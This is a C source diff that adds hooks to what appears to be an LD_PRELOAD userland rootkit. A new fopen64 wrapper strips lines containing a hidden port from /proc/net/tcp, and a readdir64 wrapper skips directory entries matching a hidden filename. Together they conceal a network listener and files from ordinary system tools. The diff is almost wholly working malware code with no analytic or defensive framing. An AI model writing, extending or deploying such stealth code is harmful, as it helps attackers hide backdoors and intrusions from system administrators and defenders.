@@ -225,6 +225,38 @@ FILE *fopen(const char *pathname, const char *mode)
 	return fp;
 }
 
+
+FILE *fopen64(const char *pathname, const char *mode)
+{
+	FILE *(*orig_fopen64)(const char *pathname, const char *mode);
+	orig_fopen64=dlsym(RTLD_NEXT,"fopen64");
+	char *ptr_tcp = strstr(pathname, "/proc/net/tcp");
+	FILE *fp;
+
+	if (ptr_tcp != NULL)
+	{
+		char line[256];
+		FILE *temp64 = tmpfile64();
+		fp = orig_fopen64(pathname, mode);
+		while (fgets(line, sizeof(line), fp))
+		{
+			char *listener = strstr(line, HEXPORT);
+			if (listener != NULL)
+			{
+				continue;
+			}
+			else
+			{
+				fputs(line, temp64);
+			}
+		}			
+		return temp64;
+	}
+	
+	fp = orig_fopen64(pathname, mode);
+	return fp;
+}
+
 struct dirent *readdir(DIR *dirp)
 {
 	struct dirent *(*new_readdir)(DIR *dir);
@@ -232,6 +264,20 @@ struct dirent *readdir(DIR *dirp)
 	struct dirent *olddir;
 
 	while(olddir = new_readdir(dirp))
+	{
+		if(strstr(olddir->d_name,FILENAME) == 0)
+			break;
+	}
+	return olddir;
+}
+
+struct dirent64 *readdir64(DIR *dirp)
+{
+	struct dirent64 *(*new_readdir64)(DIR *dir);
+	new_readdir64=dlsym(RTLD_NEXT,"readdir64");
+	struct dirent64 *olddir;
+
+	while(olddir = new_readdir64(dirp))
 	{
 		if(strstr(olddir->d_name,FILENAME) == 0)
 			break;
